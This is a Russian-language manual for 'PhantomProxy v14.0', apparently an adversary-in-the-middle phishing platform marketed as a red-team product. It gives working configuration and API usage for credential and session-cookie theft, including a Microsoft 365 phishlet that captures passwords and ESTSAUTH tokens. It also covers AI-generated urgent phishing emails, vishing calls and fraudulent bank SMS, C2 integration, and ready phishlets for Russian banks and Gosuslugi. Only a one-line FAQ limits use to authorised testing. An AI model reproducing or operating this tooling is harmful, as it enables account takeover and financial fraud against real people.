# 📖 PHANTOMPROXY v14.0 - ПОЛНАЯ ИНСТРУКЦИЯ

**Версия:** 14.0.0  
**Дата:** 20 февраля 2026

---

## 📋 СОДЕРЖАНИЕ

1. [Установка](#установка)
2. [Быстрый старт](#быстрый-старт)
3. [Конфигурация](#конфигурация)
4. [Использование](#использование)
5. [API Reference](#api-reference)
6. [Phishlets](#phishlets)
7. [Troubleshooting](#troubleshooting)
8. [FAQ](#faq)

---

## 🚀 УСТАНОВКА

### Способ 1: Автоматическая установка

#### Linux:
```bash
# 1. Клонировать репозиторий
git clone https://github.com/rpauts2/phantom-proxy.git
cd phantom-proxy

# 2. Запустить установщик
sudo ./install.sh

# 3. Проверить установку
sudo systemctl status phantomproxy
```

#### Windows:
```powershell
# 1. Клонировать репозиторий
git clone https://github.com/rpauts2/phantom-proxy.git
cd phantom-proxy

# 2. Запустить от имени Администратора
.\install.ps1

# 3. Перезагрузить компьютер
```

### Способ 2: Docker

```bash
# 1. Клонировать репозиторий
git clone https://github.com/rpauts2/phantom-proxy.git
cd phantom-proxy

# 2. Запустить все сервисы
docker-compose up -d

# 3. Проверить статус
docker-compose ps

# 4. Посмотреть логи
docker-compose logs -f
```

### Способ 3: Ручная установка

#### Требования:
- Go 1.21+
- Python 3.11+
- Node.js 20+
- Redis 7+
- PostgreSQL 16+ (опционально)

#### Установка:

```bash
# 1. Установить Go зависимости
go mod download

# 2. Установить Python зависимости
pip install -r requirements.txt

# 3. Установить Node.js зависимости
cd frontend && npm install

# 4. Создать SSL сертификаты
mkdir -p certs
openssl req -x509 -newkey rsa:4096 \
  -keyout certs/key.pem \
  -out certs/cert.pem \
  -days 365 -nodes

# 5. Собрать бинарник
go build -ldflags="-s -w" -o phantom-proxy ./cmd/phantom-proxy-v14

# 6. Запустить
./phantom-proxy --config config.yaml
```

---

## ⚡ БЫСТРЫЙ СТАРТ

### 1. Запуск

```bash
# Systemd (Linux)
sudo systemctl start phantomproxy

# Docker
docker-compose up -d

# Вручную
./phantom-proxy --config config.yaml
```

### 2. Проверка

```bash
# Health check
curl http://localhost:8080/health

# Console UI
python console.py

# Frontend
# Открыть http://localhost:3000
```

### 3. Первая настройка

```bash
# 1. Изменить API ключ
nano config.yaml
# api_key: "your-secure-random-string"

# 2. Сгенерировать сертификаты
./certs/generate.sh

# 3. Перезапустить
sudo systemctl restart phantomproxy
```

---

## ⚙️ КОНФИГУРАЦИЯ

### Базовая (config.yaml)

```yaml
# Сеть
bind_ip: "0.0.0.0"
https_port: 8443
domain: "your-domain.com"

# Сертификаты
cert_path: "./certs/cert.pem"
key_path: "./certs/key.pem"

# База данных
database_path: "./phantom.db"
database_type: "sqlite"

# API
api_enabled: true
api_port: 8080
api_key: "change-me-to-secure-random-string"

# Логирование
debug: false
log_path: "./logs/phantom.log"
log_level: "info"
```

### Multi-tenant

```yaml
multi_tenant_enabled: true

# Тарифные планы
plans:
  free:
    max_sessions: 100
    max_users: 5
  pro:
    max_sessions: 1000
    max_users: 25
  enterprise:
    max_sessions: 10000
    max_users: 100
```

### Risk Score

```yaml
risk_score_enabled: true
risk_threshold_high: 80
risk_threshold_critical: 95

# Веса факторов
risk_weights:
  click_speed: 0.15
  form_submission: 0.20
  hover_patterns: 0.10
  time_on_page: 0.10
  mouse_movement: 0.10
  keyboard_patterns: 0.15
  previous_clicks: 0.10
  device_fingerprint: 0.10
```

### Vishing/Smishing

```yaml
vishing_enabled: true
vishing_provider: "twilio"

# Twilio
twilio_account_sid: "ACxxxxxxxx"
twilio_auth_token: "your-token"
twilio_phone_number: "+1234567890"

# SMS.ru
smsru_api_key: "your-api-key"

# ElevenLabs (TTS)
elevenlabs_api_key: "your-api-key"
```

### C2 Integration

```yaml
v13:
  c2:
    sliver:
      enabled: true
      server_url: "https://sliver.example.com"
      operator_token: "your-token"
      callback_host: "phantom.example.com"
    
    empire:
      enabled: true
      server_url: "https://empire.example.com"
      username: "empire_user"
      password: "empire_pass"
```

### Zero-Trust mTLS

```yaml
mtls_enabled: true
mtls_cert_path: "./certs/server.crt"
mtls_key_path: "./certs/server.key"
mtls_ca_cert_path: "./certs/ca.crt"
mtls_verify_client: true
mtls_min_tls_version: "TLS13"
```

### Authentication

```yaml
auth_enabled: true
auth_provider: "keycloak"  # keycloak, zitadel, internal

auth_server_url: "https://keycloak.example.com"
auth_realm: "phantom"
auth_client_id: "phantom-proxy"
auth_client_secret: "your-secret"
```

### FSTEC Compliance

```yaml
fstec_enabled: true
fstec_encrypt_logs: true
fstec_category: "УЗ-2"  # УЗ-1, УЗ-2, УЗ-3, УЗ-4
```

---

## 💻 ИСПОЛЬЗОВАНИЕ

### Console UI

```bash
# Запустить консоль
python console.py

# Доступные команды:
help          # Показать справку
status        # Статус системы
dashboard     # Главная панель
sessions      # Активные сессии
phishlets     # Загруженные фишлеты
logs          # Системные логи
clear         # Очистить экран
quit          # Выход
```

### Web Interface

```bash
# Открыть в браузере
http://localhost:3000

# Вкладки:
- Overview    # Общая статистика
- Sessions    # Управление сессиями
- Risk        # Анализ рисков
- Phishlets   # Фишлеты
- C2          # C2 интеграция
- Terminal    # Консоль
```

### Makefile Commands

```bash
make help         # Показать все команды
make build        # Собрать бинарник
make run          # Запустить
make test         # Запустить тесты
make test-go      # Go тесты
make test-python  # Python тесты
make docker       # Запустить Docker
make docker-stop  # Остановить Docker
make clean        # Очистить
make lint         # Линтеры
make fmt          # Форматирование
make check        # Полная проверка
make dev          # Dev режим
make backup       # Создать бэкап
make health       # Проверка здоровья
make status       # Статус системы
```

### Backup & Restore

```bash
# Создать бэкап
python backup.py backup

# Список бэкапов
python backup.py list

# Восстановить
python backup.py restore backups/phantom_backup_20260220.tar.gz
```

### Health Check

```bash
# Скрипт
./healthcheck.sh

# Make
make health

# Docker
docker-compose ps
```

---

## 📡 API REFERENCE

### Base URL
```
http://localhost:8080
```

### Authentication
```bash
curl -H "Authorization: Bearer YOUR_API_KEY" \
  http://localhost:8080/api/v1/stats
```

### Core Endpoints

#### Health Check
```bash
GET /health

# Response:
{
  "status": "healthy",
  "version": "14.0.0",
  "uptime": "24h 15m"
}
```

#### Statistics
```bash
GET /api/v1/stats

# Response:
{
  "total_sessions": 847,
  "active_sessions": 23,
  "total_credentials": 156,
  "risk_distribution": {
    "low": 312,
    "medium": 289,
    "high": 178,
    "critical": 68
  }
}
```

#### Sessions
```bash
# List
GET /api/v1/sessions?limit=50&offset=0

# Get
GET /api/v1/sessions/{session_id}

# Delete
DELETE /api/v1/sessions/{session_id}
```

#### Phishlets
```bash
# List
GET /api/v1/phishlets

# Enable
POST /api/v1/phishlets/{id}/enable

# Disable
POST /api/v1/phishlets/{id}/disable
```

### Risk Score API

#### Get Risk Score
```bash
GET /api/v1/risk/{user_id}

# Response:
{
  "user_id": "user_123",
  "overall_score": 75,
  "risk_level": "high",
  "trend": "worsening",
  "factors": {
    "click_speed": 80,
    "form_submission": 60,
    ...
  }
}
```

#### Track Event
```bash
POST /api/v1/risk/events

# Request:
{
  "user_id": "user_123",
  "event_type": "click",
  "event_data": {
    "x": 150,
    "y": 300,
    "element": "button.submit"
  }
}
```

### AI Service API

#### Generate Email
```bash
POST http://localhost:8081/v1/generate/email

# Request:
{
  "target_data": {
    "name": "John Doe",
    "company": "Acme Corp",
    "position": "IT Manager",
    "email": "john@acme.com"
  },
  "template": "security_alert",
  "language": "en",
  "tone": "urgent"
}

# Response:
{
  "success": true,
  "email_body": "Dear John Doe,\n\nWe have detected...",
  "subject": "URGENT: Account Verification Required",
  "confidence": 0.92
}
```

#### Generate Phishlet
```bash
POST http://localhost:8081/v1/generate/phishlet

# Request:
{
  "target_url": "https://login.microsoftonline.com",
  "target_name": "Microsoft 365",
  "login_fields": ["email", "password"]
}
```

#### RAG Search
```bash
POST http://localhost:8081/v1/rag/search

# Request:
{
  "query": "Microsoft phishing campaigns",
  "n_results": 5
}
```

### Vishing API

#### Start Call
```bash
POST /api/v1/vishing/calls

# Request:
{
  "target_phone": "+79991234567",
  "script_id": "it_support",
  "voice_id": "aleksandr",
  "max_duration": 300
}
```

#### Send SMS
```bash
POST /api/v1/smishing/send

# Request:
{
  "target_phone": "+79991234567",
  "message": "Your card is blocked. Call 8-800-XXX-XX-XX"
}
```

### FSTEC API

#### Get Audit Logs
```bash
GET /api/v1/fstec/audit?limit=100&level=AUDIT
```

#### Generate Report
```bash
POST /api/v1/fstec/report

# Request:
{
  "category": "УЗ-1",
  "period": "last_30_days"
}
```

#### Validate Compliance
```bash
GET /api/v1/fstec/validate?category=УЗ-2
```

---

## 🎣 PHISHLETS

### Что такое Phishlet?

Phishlet - это YAML конфигурация для перехвата сессий конкретного сервиса.

### Структура Phishlet

```yaml
id: microsoft_365
author: Your Name
description: Microsoft 365 phishing
min_ver: 2.3.0

proxy_hosts:
  - phish_sub: login
    orig_sub: login
    domain: microsoftonline.com
    session: true
    is_landing: true

sub_filters:
  - triggers_on: login.microsoftonline.com
    orig_sub: login
    domain: microsoftonline.com
    search: 'https://{orig_sub}.{domain}'
    replace: 'https://{phish_sub}.{domain}'
    mimes:
      - text/html
      - application/javascript

auth_tokens:
  - domain: '.microsoftonline.com'
    keys:
      - 'ESTSAUTH'
      - 'ESTSAUTHPERSISTENT'

credentials:
  username:
    key: 'login'
    type: 'post'
  password:
    key: 'passwd'
    type: 'post'

auth_urls:
  - '/common/oauth2/v2.0/authorize'

login:
  domain: 'login.microsoftonline.com'
  path: '/common/oauth2/v2.0/authorize'
  method: 'GET'
  parameters:
    - name: 'client_id'
      value: 'd3590ed6-52b3-4102-aeff-aad2292ab01c'

js_inject:
  - triggers_on: 'login.microsoftonline.com'
    js: |
      // Custom JavaScript
```

### Использование

```bash
# Загрузить все фишлеты
./phantom-proxy --load-phishlets ./configs/phishlets

# Проверить загруженные
curl http://localhost:8080/api/v1/phishlets

# Включить фишлет
curl -X POST http://localhost:8080/api/v1/phishlets/microsoft_365/enable \
  -H "Authorization: Bearer YOUR_API_KEY"
```

### Готовые Phishlets

В комплекте 10 готовых конфигураций:
1. ✅ Microsoft 365
2. ✅ Google Workspace
3. ✅ Сбербанк Бизнес
4. ✅ Тинькофф Бизнес
5. ✅ Госуслуги
6. ✅ Office 365
7. ✅ Verdebudget Microsoft

---

## 🔧 TROUBLESHOOTING

### Проблема: Не запускается

**Решение:**
```bash
# Проверить логи
sudo journalctl -u phantomproxy -f

# Проверить порты
netstat -tlnp | grep 8443

# Проверить сертификаты
ls -la certs/

# Пересоздать сертификаты
openssl req -x509 -newkey rsa:4096 \
  -keyout certs/key.pem -out certs/cert.pem \
  -days 365 -nodes
```

### Проблема: Docker не запускается

**Решение:**
```bash
# Проверить Docker
docker ps

# Перезапустить Docker
sudo systemctl restart docker

# Проверить логи
docker-compose logs -f

# Очистить и пересоздать
docker-compose down -v
docker-compose up -d
```

### Проблема: Frontend не работает

**Решение:**
```bash
# Проверить Node.js
node --version

# Переустановить зависимости
cd frontend
rm -rf node_modules package-lock.json
npm install
npm run dev

# Проверить порт
curl http://localhost:3000
```

### Проблема: AI не работает

**Решение:**
```bash
# Проверить Ollama
ollama list

# Запустить Ollama
ollama serve

# Проверить AI сервис
curl http://localhost:8081/health

# Перезапустить AI сервис
docker-compose restart ai-service
```

### Проблема: Тесты не проходят

**Решение:**
```bash
# Запустить с verbose
go test -v ./...
pytest -v

# Проверить зависимости
go mod download
pip install -r requirements.txt

# Очистить кэш
go clean -testcache
```

---

## ❓ FAQ

### Q: Это легально?
**A:** Только для авторизованного тестирования безопасности. Требуется письменное разрешение владельца систем.

### Q: Какие требования к железу?
**A:**
- **Minimum:** 2 CPU, 4GB RAM, 20GB SSD
- **Recommended:** 4 CPU, 8GB RAM, 50GB SSD
- **Production:** 8 CPU, 16GB RAM, 100GB SSD

### Q: Можно ли использовать в production?
**A:** Да, система готова к production использованию (85% готовности). Требуется доработка для 100% enterprise ready.

### Q: Как обновить?
**A:**
```bash
git pull
make build
sudo systemctl restart phantomproxy
```

### Q: Как сделать бэкап?
**A:**
```bash
python backup.py backup
```

### Q: Где логи?
**A:**
```bash
# System logs
sudo journalctl -u phantomproxy -f

# Application logs
tail -f logs/phantom.log

# Docker logs
docker-compose logs -f
```

### Q: Как настроить multi-tenant?
**A:**
```yaml
# config.yaml
multi_tenant_enabled: true

# Создать tenant
curl -X POST http://localhost:8080/api/v1/tenants \
  -H "Authorization: Bearer KEY" \
  -H "Content-Type: application/json" \
  -d '{"name":"Acme Corp","slug":"acme","plan":"pro"}'
```

### Q: Как интегрировать с SIEM?
**A:**
```bash
# Отправить логи в SIEM
# Пример для Splunk
curl -X POST https://splunk.example.com:8088/services/collector \
  -H "Authorization: Splunk TOKEN" \
  -d '{"event": "log message"}'
```

### Q: Как настроить rate limiting?
**A:**
```yaml
# config.yaml
rate_limiting:
  enabled: true
  requests_per_minute: 100
  burst: 20
```

### Q: Как включить debug mode?
**A:**
```yaml
# config.yaml
debug: true
log_level: "debug"
```

---

## 📞 SUPPORT

- **GitHub Issues:** https://github.com/rpauts2/phantom-proxy/issues
- **Security:** security@phantomseclabs.com
- **Documentation:** https://docs.phantomproxy.io

---

**© 2026 PhantomSec Labs - Enterprise Red Team Platform v14.0**
